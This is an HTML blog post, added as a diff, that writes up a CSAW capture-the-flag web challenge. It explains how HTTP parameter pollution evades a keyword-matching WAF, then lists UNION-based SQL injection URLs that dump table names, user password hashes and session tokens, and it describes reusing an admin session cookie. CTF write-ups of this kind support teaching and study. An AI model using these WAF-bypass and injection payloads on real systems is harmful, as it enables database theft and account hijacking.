@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Bypassing WAF via HTTP Parameter Pollution | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-03-11T17:22:13.000Z" itemprop="datePublished">
+          2013-03-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/WAF/'>WAF</a>
+    
+    
+</span>
+    <h1 class="post-title">Bypassing WAF via HTTP Parameter Pollution</h1>
+    <section class="post-content">
+      <p>Last week I was invited to join a team to participate in a CTF (Capture The Flag) contest organized by <a href="https://csawctf.poly.edu/" target="_blank" rel="external">CSAW</a> Team.</p>  <p>   <br>With my wife and kids around, I only had the opportunity to pick one challenge related to Web Exploitation named: &quot;HorceForce&quot; worth 300 points! Basically, you were provided with a low-privilege account and needed to find your way to get Administrator access.</p>  <p>   <br>So, there are multiple resources explaining how to exploit it, but definitely I want to share my experience.</p>  <p>   <br>After sending some single quotes it was easy to find a SQL Injection bug by getting the well known &quot;MySQL SQL Error Message&quot;.</p>  <p>   <br>So, as you all know the first attempt was something like:</p>  <p>   <br><font color="#00ff40"><a href="http://128.238.66.217/horse.php?id=7" target="_blank" rel="external">http://128.238.66.217/horse.php?id=7</a> or 1 IN (select current_user)</font></p>  <p>   <br>And I got I ERROR Message saying something like &quot;PLEASE STOP trying to hack this blablablabla site&quot;.</p>  <p>   <br>Then after many techniques to bypass the filter I realized the <a href="http://ha.cker.in/tag/WAF" target="_blank">WAF</a> was configured to deny any string containing either &quot;select&quot; or &quot;union&quot;, blindly I assumed the WAF’s regular expression was something like:</p>  <p>   <br>/^.<em>select.</em>$/ or /^.<em>union.</em>$/ </p>  <p>   <br>Which means, every string which even makes no sense from SQLi point of view like: <font color="#00ff00">blablaSELECTblabla</font> or a bypass technique like: <font color="#00ff00">/<em>!union</em>/</font> , were triggering the Warning Message.</p>  <p>   <br>After some research I found the <a href="http://www.acunetix.com/blog/whitepaper-http-parameter-pollution/" target="_blank" rel="external">HTTP Pollution</a> technique which basically allows the attacker (among other things) to play with the GET Parameters in order to confuse the WAF filter.</p>  <p>   <br>So, how it works?</p>  <p>   <br>Let’s say you have the GET parameter &quot;id&quot;, you can duplicate it (or even add it many times) and send something like:</p>  <p>   <br><font color="#00ff00">?id=value1&amp;id=value2</font></p>  <p>   <br>And, depending on the Framework used (PHP, Java, ASP.NET, etc) the parameters are going to be parsed differently, in our case with Apache/PHP, if you inject the same parameter multiple times, only the last one will be parsed by the Framework (see table below) but guess what? Only the first parameter is going to be analyzed by the WAF!</p>  <p>   <br>This means, by injecting: ?id=7&amp;id=[SQLi]</p>  <p>   <br>WAF Network Layer parses&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; id=7&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;- Good to go!     <br>PHP Application Layer parses&#160;&#160;&#160;&#160;&#160;&#160; id=[SQLi]&#160;&#160;&#160;&#160; &lt;- SQLi successfully injected</p>  <p>   <br>So, this is a typical example where you can inject something that is going to be treated differently at Network Layer and Application Layer.</p>  <p>   <br>Below is a table where you can find how other Frameworks react when receiving the same parameter multiple times. Like ASP.NET, if it receives two parameters, it will concatenate them, and therefore you can split the attack into those fields to bypass the WAF, which is out of scope of this blog.</p>  <p><a href="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001.jpg" target="_blank" rel="external"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001_thumb.jpg" width="1284" height="740"></a></p><br><a id="more"></a><br><p>So, then my next try was to inject something like:</p>  <p>   <br><font color="#00ff00">128.238.66.217/horse.php?id=0&amp;id=7%20union%20select%201,2,3,current_user</font></p>  <p>   <br>You can notice, all the injection is taking place in the second parameter, which is not being parsed by the WAF and voila!!! I got my first successful response:</p>  <p>   <br><font color="#008000">csaw_chal1@localhost</font></p>  <p>   <br>After that, all is simple SQLi to enumerate tables:</p>  <p>   <br>128.238.66.217/horse.php?id=0&amp;id=7%20union%20select%20table_name,2,3,4%20from%20information_schema.tables%20limit%201</p>  <p>   <br><font color="#008000">horses      <br>sessions       <br>users</font></p>  <p>   <br>Then get fields from table users:</p>  <p>   <br><font color="#00ff00">128.238.66.217/horse.php?id=0&amp;id=7 union select 1,2,3,column_name from information_schema.columns where table_name=’users’ limit 200</font></p>  <p>   <br><font color="#008000">Description: user_id      <br>Description: username       <br>Description: password       <br>Description: name       <br>Description: level       <br></font></p>  <p>And then dump the username and password trying to identify the Administrator password:</p>  <p>   <br><font color="#008000">Description: administrator      <br>Pass: $2a$08$kF9H1vqa.fogHc2JwbFNweay.sgdksbiuB9f7MN5mNZgcG6y7BrFG       <br>Description: michael_vick       <br>Pass: $2a$08$B2fI59Zzph61LajSSgkoB.i0YJ9HH8wBobmExxqPxl/.0Zu3Tijm2       <br>Description: csaw_challenger       <br>Pass: $2a$08$zFI9j/fsHKKbV0UCiavNveEIIi./v8lsqiaKxTV3T3BkrBk4XvSEK       <br>Description: beefsister33       <br>$2a$08$AUAeUut7FjkdCMfQJUuJwulgnBLbbTc0F/njHbl3mn59IS6OyADbO       <br>Description: nuclear_grandma       <br>$2a$08$edsWdwf45DDC4Vb2VPiikOspNpr3ePS5VE7z3aYsuMEZyodbkHRDK       <br>Description: teabag_swag       <br>Pass: $2a$08$uN4sFJ73Quf/b5hC3GxXIO53ewJ0W71c2Vuh4f2x.pr3iTrChvNOK</font></p>  <p>   <br>But unfortunately, those passwords were encrypted, but if you remember, there was a table named &quot;sessions&quot;, so let’s dump its content:</p>  <p>   <br><font color="#00ff00">128.238.66.217/horse.php?id=0&amp;id=7%20union%20select%201,2,3,session%20from%20sessions%20limit%20200</font></p>  <p>   <br><font color="#008000">Description: bsv30irdq0PCvJxJrCAxROcmdXaUiwgQtPeg5J75EYgrH8jyHQ      <br>Description: hbpnEGKo2WeLvQuQL0kb8vyyOHMn96ZYAROXmBggB6Pdr0FX4p       <br>Description: VnRu2Zcv7REYTgHOqafggyYn3hA3cq1D9B4u4IxEcnB0TgPT4j       <br>Description: UkOAVJ4ZAuX1t0Hib4maJccftZVeC4TdCZ8WxhQJZKqQ9axbwc       <br>Description: 4gNszBZeSDjjKE5sSJwIcPOzTvhM90IR9JrqPa286tLfiDNDyp       <br>Description: hmmJU3LrcIO7yJ77aSOsL9YIEjKITkOLg1CE0HF6Cnsbv2J077       <br>Description: SL2v2sJvyu7Xw5Lc5b8UBSNFGOFhMfFrCWsgNGZZBSBfazpTlX</font></p>  <p>   <br>Then, you just go to your browser, use an Add-on like &quot;Cookies Manager&quot; from Firefox and change your current session value with one of the ones found above and ….. we got the Admin session:</p>  <p>   <br><font color="#004000">bsv30irdq0PCvJxJrCAxROcmdXaUiwgQtPeg5J75EYgrH8jyHQ</font></p>  <p>   <br>Which give us the precious key:</p>  <p><a href="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image002.jpg" target="_blank" rel="external"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image002_thumb.jpg" width="1154" height="411"></a></p>  <p>Via <a href="http://danuxx.blogspot.com/2012/10/bypassing-waf-via-http-parameter.html" target="_blank" rel="external">http://danuxx.blogspot.com/2012/10/bypassing-waf-via-http-parameter.html</a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/978.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/978.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/978.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/978.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/979.seo/">
+        ← 买卖宝存储型xss盲打后台
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/977.seo/">
+        淘宝站内信xss直接实现定向攻击 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
